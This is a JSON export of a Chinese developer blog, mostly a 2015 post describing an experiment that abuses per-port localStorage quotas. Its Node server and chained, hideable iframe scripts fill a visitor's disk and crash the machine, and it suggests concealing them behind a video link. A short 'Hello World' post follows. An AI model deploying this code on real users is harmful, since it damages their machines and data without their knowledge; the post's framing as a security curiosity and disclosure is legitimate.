{"meta":{"title":"Luck_Liu","subtitle":"������ô��������ȥ����","description":"�����Լ��Ŀռ䡣","author":"Luck_Liu","url":"//litten.me"},"posts":[{"title":"作为一个前端，可以如何机智地弄坏一台电脑？","slug":"hack-in-localstorage","date":"2015-07-06T14:30:00.000Z","updated":"2017-01-14T06:35:57.503Z","comments":true,"path":"2015/07/06/hack-in-localstorage/","link":"","permalink":"//litten.me/2015/07/06/hack-in-localstorage/","excerpt":"有人说，前端的界限就在浏览器那儿。\n无论你触发了多少bug，最多导致浏览器崩溃，对系统影响不到哪去。这就像二次元各种炫酷的毁灭世界，都不会导致三次元的世界末日。然而，作为一个前端，我发现是有方式打开次元大门的…\n这个实验脑洞较大，动机无聊，但某种意义上反映了一些安全问题。想象一下，有天你在家里上网，吃着火锅还唱着歌，点开一个链接，电脑突然就蓝屏了！想想还真有点小激动。","text":"有人说，前端的界限就在浏览器那儿。 无论你触发了多少bug，最多导致浏览器崩溃，对系统影响不到哪去。这就像二次元各种炫酷的毁灭世界，都不会导致三次元的世界末日。然而，作为一个前端，我发现是有方式打开次元大门的… 这个实验脑洞较大，动机无聊，但某种意义上反映了一些安全问题。想象一下，有天你在家里上网，吃着火锅还唱着歌，点开一个链接，电脑突然就蓝屏了！想想还真有点小激动。 起因故事得从localStorage说起。 html5的本地存储，相信大家都不陌生。将数据以二进制文件形式存储到本地，在当前应用得非常广泛。windows下的chrome，localStorage存储于C:\\Users\\xxx\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Storage文件夹中。但如果任由网页无限写文件，对用户硬盘的伤害可想而知，因而浏览器对其做了大小限制。 对于一个域名+端口，PC侧的上限是5M-10M之间，移动侧是则不大于2.5M。 那么问题就变成：这样的限制足够保护用户硬盘了吗？ 关键关键的问题在于，这一限制，针对的是一个域名+端口。也就是说，你访问同一个域名的不同端口，它们的localStorage并无关联，是分开存储的。 我用node简单地开启了服务器，这时，用户访问http://127.0.0.1:1000到http://127.0.0.1:1099这100个端口，会请求到同一个页面：index.html： 1234567891011121314151617var http = require('http');var fs = require('fs');//100个端口for(var port = 1000; port&lt; 1100; port++)&#123; http.createServer(function (request, response) &#123; //请忽略这种循环读文件的方式，只为了简便 fs.readFile('./index.html', function(err, content)&#123; if(err) &#123; &#125; else &#123; response.writeHead(200, &#123; 'Content-Type' : 'text/html; charset=UTF-8' &#125;); response.write(content); response.end(); &#125; &#125;); &#125;).listen(port, '127.0.0.1');&#125; 当然，这个index.html里涉及了localStorage写操作。 123456var s = \"\";//慢慢来，别写太大了，好害怕…for(var i=0; i&lt; 3 * 1024 * 1024; i++)&#123; s += \"0\";&#125;localStorage.setItem(\"testData\", s); 我试着用浏览器分别访问了几个端口，结果是分开存储。一切跟剧本一样。 自动遍历但这种程度还不够。如果要实验变得更好（xie）玩（e）一些，问题就变成如何让用户自动遍历这些端口？ iframe是个好的尝试。只要一打开http://127.0.0.1: 1000，页面的脚步就会创建一个iframe，去请求http://127.0.0.1: 1001，一直循环下去。 1234567891011121314151617181920212223var Main = (function()&#123; var _key = \"testData\"; var _max = 1100; //最大限制 return &#123; init: function()&#123; //慢慢来，别写太大了，好害怕… var s = \"\"; for(var i=0; i&lt; 3 * 1024 * 1024; i++)&#123; s += \"0\"; &#125; localStorage.setItem(_key, s); var port = parseInt(location.port)+1; if(port &gt; _max) return; //新添加iframe var url = \"http://127.0.0.1:\" + port; var $iframe = document.createElement(\"iframe\"); $iframe.src = url; document.getElementsByTagName(\"body\")[0].appendChild($iframe); &#125; &#125;&#125;)(); 当然iframe我们还可以设置为不可见，以掩盖这种不厚道的行为…比方说，有人发给你一个链接，你打开后发现是个视频，而你根本注意不到背后的脚本，在视频播放的几分钟里，快要把你的C盘写满。 然后我就看到请求如潮水渐涨： 但是，请求到1081端口，最新的chrome就崩溃掉了…原来iframe嵌套太多，已经到达了浏览器的极限。 ###防止浏览器崩溃 C盘还未撑满，同志还需努力。怎么办？ 突然想到，到达iframe极限之前，我们可以重定向啊。每访问50个端口，就使用window.location.href重定向一次，去确保浏览器不崩溃。 1234567891011121314151617181920212223242526272829var Main = (function()&#123; var _key = \"testData\"; var _max = 1200; //最大限制 var _jumpSpace = 50; //为避免iframe过多导致浏览器crash，每50个执行跳转 return &#123; init: function()&#123; //慢慢来，别写太大了，好害怕… var s = \"\"; for(var i=0; i&lt; 3 * 1024 * 1024; i++)&#123; s += \"0\"; &#125; localStorage.setItem(_key, s); var port = parseInt(location.port)+1; if(port &gt; _max) return; if(port % _jumpSpace == 0)&#123; //每50个，重定向一次 window.location.href = url; &#125;else&#123; //新添加iframe var $iframe = document.createElement(\"iframe\"); $iframe.src = url; document.getElementsByTagName(\"body\")[0].appendChild($iframe); &#125; &#125; &#125;&#125;)(); 事实证明，这种蛮拼的方法的确可行。 至此，只要访问http://127.0.0.1: 1000，就会往Local Storage文件夹里写入近500M无用数据： 里面的数据是这样的： 继续实验的黑科技算了下我的C盘还有空间嘛，那就把端口数量从100增长到200个。结果是这样的，到达了1.17G大小。 在后续的实验中，我就慢慢的把端口数量与存储的数据调大。 电脑也运行得越来越慢。这是为什么呢？ 我观察到，有时候执行localStorage.setItem()后，在文件夹里不一定立即能看到数据文件。怀疑这些数据会被chrome先放到内存里，以避免重复读写带来的消耗，在空闲或关闭的时机，再写进硬盘里。 但此时，浏览器已经影响到系统了。它处于一种“不会崩溃”，但“因为占用了许多内存，已经妨碍用户电脑的正常使用”的状态。即使用户关闭了浏览器窗口，也不会很快恢复。要知道读写任务并不是随窗口关闭而终止的，否则浏览器会丢失数据。 遭遇黑科技的人们能做的只有： 等待； 用任务管理器关掉chrome进程，再等待； 相信并尝试“重启电脑解决90%电脑问题”的科学论断 可以说，浏览器的内心几乎是崩溃的。 最后最后，还是得用严肃脸告诫一下：害人之心不可无。本实验，从一开始就是怀揣着将安全问题上交给国家的初衷去做的（是的就是这么纯粹）。 后续，看着C盘还有2G空间，我又把端口增长到2000个，试下会发生什么。由于请求过多，需要一定时间，我就去做别的事情了。回来后发现房间安静祥和，美轮美奂，一片蓝光，像是加了特技。 那么问题来了，计算机修理哪家强？有点急…","raw":null,"content":null,"categories":[],"tags":[{"name":"js","slug":"js","permalink":"//litten.me/tags/js/"},{"name":"安全","slug":"安全","permalink":"//litten.me/tags/安全/"},{"name":"黑科技","slug":"黑科技","permalink":"//litten.me/tags/黑科技/"}]},{"title":"Hello World","slug":"hello-world","date":"2012-12-12T17:39:00.000Z","updated":"2017-01-14T06:35:57.524Z","comments":true,"path":"2012/12/13/hello-world/","link":"","permalink":"//litten.me/2012/12/13/hello-world/","excerpt":"","text":"在Winiex的推荐和帮助下，这个octopress博客终于搭建起来了。 折腾了两天多，在github page上看到自己的博客加载下来时，突然有种错综复杂的恍惚感。是的，它不是qq空间，不是新浪博客，不是豆瓣小站，也不是贴吧。它更像是属于自己的一块小小的领地，因而我满足于这种归属感。我愿在上面安静劳作。 一个农民，通过自身努力终于分到了一块地，不再需要在地主的土地上创造流量价值时，于是翻身作主的他可以宣告说：Hello World。当然这个农民确切来说是个码农。 感谢Zespia提供的slash主题。我很喜欢这种色调。","raw":null,"content":null,"categories":[],"tags":[{"name":"杂谈","slug":"杂谈","permalink":"//litten.me/tags/杂谈/"},{"name":"octopress","slug":"octopress","permalink":"//litten.me/tags/octopress/"}]}]}